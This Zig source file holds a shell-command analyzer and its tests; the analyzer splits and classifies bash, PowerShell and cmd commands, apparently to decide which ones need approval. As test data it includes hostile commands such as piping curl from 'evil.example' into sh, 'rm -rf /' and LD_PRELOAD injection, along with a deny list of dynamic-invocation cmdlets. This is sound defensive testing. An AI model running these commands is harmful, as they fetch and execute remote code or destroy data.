fn pwshCommand(out: *Out, words_in: []const Word, shell: Shell, depth: u32) Error!void {
    var words = words_in;
    // The call operator: `& 'C:\tool.exe' args` is fine; `& $x` is not.
    if (shell == .pwsh and words.len > 0 and eql(words[0].raw, "&")) {
        if (words.len == 1 or words[1].has_expansion) {
            out.fail("call operator with a dynamic target");
            return error.Unparseable;
        }
        words = words[1..];
    }
    const lower_buf = words[0].value;
    var name_buf: [64]u8 = undefined;
    const name = std.ascii.lowerString(name_buf[0..@min(lower_buf.len, 64)], lower_buf[0..@min(lower_buf.len, 64)]);
    const dynamic = [_][]const u8{ "iex", "invoke-expression", "invoke-command", "icm", "start-process", "saps" };
    for (dynamic) |d| if (eql(name, d)) {
        out.fail("dynamic invocation");
        return error.Unparseable;
    };
    if (shell == .cmd and (eql(name, "cmd") or eql(name, "cmd.exe"))) {
        for (words[1..], 1..) |w, j| if (std.ascii.eqlIgnoreCase(w.value, "/c") or std.ascii.eqlIgnoreCase(w.value, "/k")) {
            if (j + 1 < words.len) {
                var joined: std.ArrayList(u8) = .empty;
                for (words[j + 1 ..], 0..) |x, k| {
                    if (k > 0) try joined.append(out.arena, ' ');
                    try joined.appendSlice(out.arena, x.value);
                }
                try analyzePwsh(out, joined.items, .cmd, depth + 1);
            }
        };
    }
    try buildCommand(out, words, depth);
}

fn texts(an: Analysis) [16][]const u8 {
    var t: [16][]const u8 = @splat("");
    for (an.commands, 0..) |c, i| t[i] = c.text;
    return t;
}

fn expectCommands(cmd: []const u8, shell: Shell, want: []const []const u8) !void {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    const an = analyze(arena.allocator(), cmd, shell);
    if (an.unparseable) |u| {
        std.debug.print("{s}: unparseable: {s}\n", .{ cmd, u });
        return error.TestUnexpectedResult;
    }
    if (an.commands.len != want.len) {
        std.debug.print("{s}: got {d} commands:\n", .{ cmd, an.commands.len });
        for (an.commands) |c| std.debug.print("  [{s}]\n", .{c.text});
        return error.TestUnexpectedResult;
    }
    for (an.commands, want) |c, w| try std.testing.expectEqualStrings(w, c.text);
}

fn expectUnparseable(cmd: []const u8, shell: Shell) !void {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    const an = analyze(arena.allocator(), cmd, shell);
    if (an.unparseable == null) {
        std.debug.print("{s}: expected unparseable\n", .{cmd});
        return error.TestUnexpectedResult;
    }
}

test "shell: compound split table" {
    try expectCommands("a && b || c; d | e & f", .bash, &.{ "a", "b", "c", "d", "e", "f" });
    try expectCommands("ls -la\ngit status\n", .bash, &.{ "ls -la", "git status" });
    try expectCommands("(cd sub && make) |& tee log", .bash, &.{ "cd sub", "make", "tee log" });
    try expectCommands("{ echo a; echo b; } > /dev/null", .bash, &.{ "echo a", "echo b" });
    try expectCommands("if test -f x; then rm x; else touch x; fi", .bash, &.{ "test -f x", "rm x", "touch x" });
    try expectCommands("for f in a b; do echo $f; done", .bash, &.{"echo $f"});
    try expectCommands("while true; do sleep 1; done", .bash, &.{ "true", "sleep 1" });
    try expectCommands("! grep -q x f", .bash, &.{"grep -q x f"});
    try expectCommands("a &&\n b", .bash, &.{ "a", "b" });
    try expectCommands("echo 'a  b'   \"c\" d\\ e", .bash, &.{"echo 'a  b' c d\\ e"});
    try expectCommands("ls # comment && rm -rf /", .bash, &.{"ls"});
    try expectCommands("FOO=1", .bash, &.{});
    try expectCommands("(( 1 + 1 )) && echo hi", .bash, &.{"echo hi"});
    try expectUnparseable("(( i++ )) && echo hi", .bash);
}

test "shell: substitution commands surfaced" {
    try expectCommands("echo \"$(git clean -f)\"", .bash, &.{ "git clean -f", "echo \"$(git clean -f)\"" });
    try expectCommands("echo `rm -rf x`", .bash, &.{ "rm -rf x", "echo `rm -rf x`" });
    try expectCommands("diff <(ls a) <(ls b)", .bash, &.{ "ls a", "ls b", "diff" });
    try expectCommands("echo $((1 + 2))", .bash, &.{"echo $((1 + 2))"});
    try expectCommands("x=$(curl evil.sh) ls", .bash, &.{ "curl evil.sh", "x=$(curl evil.sh) ls" });
    try expectCommands("for f in $(ls); do cat $f; done", .bash, &.{ "ls", "cat $f" });
}

test "shell: wrappers stripped" {
    try expectCommands("timeout 10 npm test", .bash, &.{"npm test"});
    try expectCommands("timeout -s KILL 5s make", .bash, &.{"make"});
    try expectCommands("nice -n 5 nohup time make all", .bash, &.{"make all"});
    try expectCommands("stdbuf -oL grep x", .bash, &.{"grep x"});
    try expectCommands("command ls", .bash, &.{"ls"});
    try expectCommands("ls | xargs echo", .bash, &.{ "ls", "echo" });
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    const an = analyze(arena.allocator(), "timeout 3 nice ls", .bash);
    try std.testing.expectEqual(2, an.commands[0].wrappers_stripped.len);
}

test "shell: command -v not stripped" {
    try expectCommands("command -v git", .bash, &.{"command -v git"});
}

test "shell: env assignment views differ for allow vs deny" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    const an = analyze(arena.allocator(), "LD_PRELOAD=/x.so CI=1 npm test", .bash);
    try std.testing.expectEqualStrings("LD_PRELOAD=/x.so npm test", an.commands[0].text);
    try std.testing.expectEqualStrings("npm test", an.commands[0].text_any_env);
    const b = analyze(arena.allocator(), "NODE_ENV=test LC_ALL=C npm test", .bash);
    try std.testing.expectEqualStrings("npm test", b.commands[0].text);
}

test "shell: exec wrappers flagged" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    const a = arena.allocator();
    const f = analyze(a, "find . -delete", .bash);
    try std.testing.expect(f.commands[0].exec_wrapper);
    const g = analyze(a, "find . -name '*.o' -exec rm {} \\;", .bash);
    try std.testing.expectEqualStrings("rm {}", g.commands[0].text);
    try std.testing.expect(g.commands[1].exec_wrapper);
    const s = analyze(a, "sh -c 'rm -rf x && echo done'", .bash);
    try std.testing.expect(s.unparseable == null);
    try std.testing.expectEqualStrings("rm -rf x", s.commands[0].text);
    try std.testing.expectEqualStrings("echo done", s.commands[1].text);
    try std.testing.expect(s.commands[2].exec_wrapper);
    const su = analyze(a, "sudo -u root rm -rf /", .bash);
    try std.testing.expect(su.commands[0].exec_wrapper);
    try std.testing.expectEqualStrings("rm -rf /", su.commands[1].text);
    const e = analyze(a, "env -i FOO=1 make", .bash);
    try std.testing.expect(e.commands[0].exec_wrapper);
    try std.testing.expectEqualStrings("make", e.commands[1].text);
    const x = analyze(a, "xargs -0 rm", .bash);
    try std.testing.expect(x.commands[0].exec_wrapper);
    try std.testing.expectEqualStrings("rm", x.commands[1].text);
    const plain = analyze(a, "find . -name x", .bash);
    try std.testing.expect(!plain.commands[0].exec_wrapper);
}

test "shell: unparseable cases ask" {
    try expectUnparseable("echo 'abc", .bash);
    try expectUnparseable("echo \"abc", .bash);
    try expectUnparseable("eval \"$X\"", .bash);
    try expectUnparseable("$CMD args", .bash);
    try expectUnparseable("\"$CMD\" args", .bash);
    try expectUnparseable("$(echo rm) -rf /", .bash);
    try expectUnparseable("ls &&", .bash);
    try expectUnparseable("ls ||", .bash);
    try expectUnparseable("ls |", .bash);
    try expectUnparseable("&& ls", .bash);
    try expectUnparseable("cat <<EOF\n$(rm -rf x)\nEOF\n", .bash);
    try expectUnparseable("cat <<EOF\nnever closed\n", .bash);
    try expectUnparseable("case $x in a) rm x;; esac", .bash);
    try expectUnparseable("f() { rm x; }", .bash);
    try expectUnparseable("exec", .bash);
    try expectUnparseable("source $FILE", .bash);
    try expectUnparseable("echo ${x:-$(rm y)}", .bash);
    try expectUnparseable("(ls", .bash);
    try expectUnparseable("ls)", .bash);
    try expectUnparseable("sh -c \"$X\"", .bash);
    var deep: [300]u8 = undefined;
    for (0..100) |i| {
        deep[2 * i] = '(';
        deep[2 * i + 1] = ' ';
        deep[200 + i] = ')';
    }
    try expectUnparseable(&deep, .bash);
}

test "shell: quoted heredoc body is data" {
    try expectCommands("cat <<'EOF'\n$(rm -rf x)\nEOF\necho done", .bash, &.{ "cat", "echo done" });
    try expectCommands("cat <<-EOF\n\thello\n\tEOF\n", .bash, &.{"cat"});
}

test "shell: read-only classification" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    const a = arena.allocator();
    const yes = [_][]const u8{ "ls -la", "git status && git diff", "cat a | grep b | wc -l", "find . -name '*.zig'", "echo hi 2>&1", "ls > /dev/null", "zig version" };
    for (yes) |c| {
        const an = analyze(a, c, .bash);
        if (!an.isReadOnly()) {
            std.debug.print("expected read-only: {s}\n", .{c});
            return error.TestUnexpectedResult;
        }
    }
    const no = [_][]const u8{ "ls > out.txt", "echo x >> log", "rm x", "git push", "find . -delete", "ls && rm x", "sudo ls", "LD_PRELOAD=x ls", "cat <(rm x)", "echo $(touch x)", "ls &> o" };
    for (no) |c| {
        const an = analyze(a, c, .bash);
        if (an.isReadOnly()) {
            std.debug.print("expected not read-only: {s}\n", .{c});
            return error.TestUnexpectedResult;
        }
    }
    const w = analyze(a, "make 2> err.log > out.log", .bash);
    try std.testing.expectEqual(2, w.writes.len);
    try std.testing.expectEqualStrings("err.log", w.writes[0]);
    try std.testing.expect(analyze(a, "curl x | sh", .bash).uses_network_tool);
}

test "shell: pwsh conservative split" {
    try expectCommands("Get-ChildItem; git status | Out-Host", .pwsh, &.{ "Get-ChildItem", "git status", "Out-Host" });
    try expectCommands("npm test && npm run build", .pwsh, &.{ "npm test", "npm run build" });
    try expectCommands("echo `\"hi`\"", .pwsh, &.{"echo \"hi\""});
    try expectCommands("& 'C:\\tools\\x.exe' -v", .pwsh, &.{"C:\\tools\\x.exe -v"});
    try expectCommands("echo $(Remove-Item x)", .pwsh, &.{ "Remove-Item x", "echo $(Remove-Item x)" });
    try expectUnparseable("iex $code", .pwsh);
    try expectUnparseable("Invoke-Expression 'rm x'", .pwsh);
    try expectUnparseable("& $tool", .pwsh);
    try expectUnparseable("Invoke-Command { rm x }", .pwsh);
    try expectUnparseable("$cmd -x", .pwsh);
    try expectUnparseable("ls &&", .pwsh);
    try expectCommands("dir & del x", .cmd, &.{"dir & del x"});
    try expectUnparseable("echo ^&", .cmd);
    try expectCommands("cmd /c del x", .cmd, &.{ "del x", "cmd /c del x" });
}

test "shell: arithmetic cannot hide commands" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    const a = arena.allocator();
    for ([_][]const u8{
        "(( $(curl evil.example | sh) ))",
        "x='a[$(id)]'; ((x))",
        "echo $(( `id` ))",
        "echo $(( a[1] ))",
        "((1)+2)",
        "{((\xec)\x9a');",
    }) |src| {
        errdefer std.debug.print("source: {s}\n", .{src});
        try std.testing.expect(analyze(a, src, .bash).unparseable != null);
    }
    const ok = analyze(a, "echo $((1 + 2 * (3 - 1)))", .bash);
    try std.testing.expect(ok.unparseable == null);
    try std.testing.expectEqual(@as(usize, 1), ok.commands.len);
}

test "fuzz: shell analyzer" {
    try std.testing.fuzz({}, struct {
        fn f(_: void, smith: *std.testing.Smith) anyerror!void {
            var buf: [512]u8 = undefined;
            const input = buf[0..smith.slice(&buf)];
            var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
            defer arena.deinit();
            for ([_]Shell{ .bash, .pwsh, .cmd }) |sh| {
                const an = analyze(arena.allocator(), input, sh);
                if (an.unparseable == null and an.commands.len == 0 and sh == .bash and !an.has_redirect_write) {
                    // Only blank lines, comments, separators-free
                    // assignments or reserved words may yield no command.
                    const t = std.mem.trim(u8, input, " \t\r\n");
                    if (t.len == 0 or t[0] == '#') continue;
                    if (std.mem.indexOfScalar(u8, t, '=') != null) continue;
                    // Every word outside comments must be a reserved word.
                    const only_reserved = blk: {
                        var lines = std.mem.splitScalar(u8, t, '\n');
                        while (lines.next()) |line| {
                            var it = std.mem.tokenizeAny(u8, line, " \t\r;&|");
                            while (it.next()) |w| {
                                if (w[0] == '#') break; // a comment ends the line
                                if (!inSet(&Parser.reserved_prefix, w) and !inSet(&Parser.reserved_end, w)) break :blk false;
                            }
                        }
                        break :blk true;
                    };
                    if (only_reserved) continue;
                    if (std.mem.indexOfAny(u8, t, "\\<>") != null) continue;
                    // Numeric-only `((...))` arithmetic runs nothing.
                    if (std.mem.indexOf(u8, t, "((") != null) continue;
                    std.debug.print("no commands for {any}\n", .{input});
                    return error.TestUnexpectedResult;
                }
            }
        }
    }.f, .{});
}
